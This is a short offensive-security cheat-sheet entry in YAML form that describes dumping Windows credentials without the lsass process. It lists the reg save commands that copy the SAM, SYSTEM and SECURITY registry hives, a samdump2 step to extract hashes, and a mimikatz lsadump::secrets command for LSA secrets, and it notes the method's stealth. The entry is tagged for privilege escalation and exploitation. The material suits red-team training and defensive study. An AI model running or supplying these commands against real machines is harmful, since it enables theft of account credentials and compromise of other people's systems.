    raw:
      file: CredDumpWithoutMimilkatz.md
      document: "---\ndescription: |\n  The lsass Process while great, is no where neaar the only way\
        \ to dump credintials from windows. One of which is access the three registry hives:\n  SAM, SYSTEM,\
        \ and SECURITY. This is a method that can be used to dump credentials without mimikatz as well\
        \ as offer some potenial stealth.  \n\ncommand: |\n  # The following command will dump the SAM,\
        \ SYSTEM, and SECURITY hives to the current directory.\n  reg save HKLM\\SAM sam.hive\n  reg save\
        \ HKLM\\SYSTEM system.hive\n  reg save HKLM\\SECURITY security.hive\n\n  #Assuming you have transfered\
        \ the hives to your kali\n  samdump2 system sam \n\n  #We can also get lsa secrets via mimikatz\n\
        \  lsadump::secrets /system:c:\\temp\\system.hive /security:c:\\temp\\security.hive\n\nitems:\n\
        \  - Shell\n  - PrivEsc\n  - Exploitation\nOS:\n  - Windows\n  - Linux\nreferences:\n  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping\n\
        \  - https://www.synacktiv.com/en/publications/lsa-secrets-revisiting-secretsdump\n\n---\n"
